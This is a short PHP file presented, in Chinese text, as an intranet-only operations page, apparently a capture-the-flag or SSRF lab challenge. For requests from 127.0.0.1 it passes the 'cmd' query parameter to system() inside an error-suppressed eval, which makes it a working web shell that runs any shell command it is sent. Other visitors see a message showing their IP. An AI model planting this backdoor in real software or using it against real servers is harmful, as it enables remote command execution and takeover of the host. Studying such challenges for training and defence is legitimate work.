 <?php 
echo "这个是内网的操作页面，只允许内网人员使用,get_cmd";
echo "<br />";
if($_SERVER["REMOTE_ADDR"] === "127.0.0.1") 
{ 
    
     
       @eval(system($_GET["cmd"]));
     
} 
else 
      { 
        echo "您的ip是".$_SERVER["REMOTE_ADDR"]."<hr/>"."不是我们的内网机器"."<hr/>"."这是一台内网机器，只接受本机请求"."<hr/>"; 
        return false; 
      } 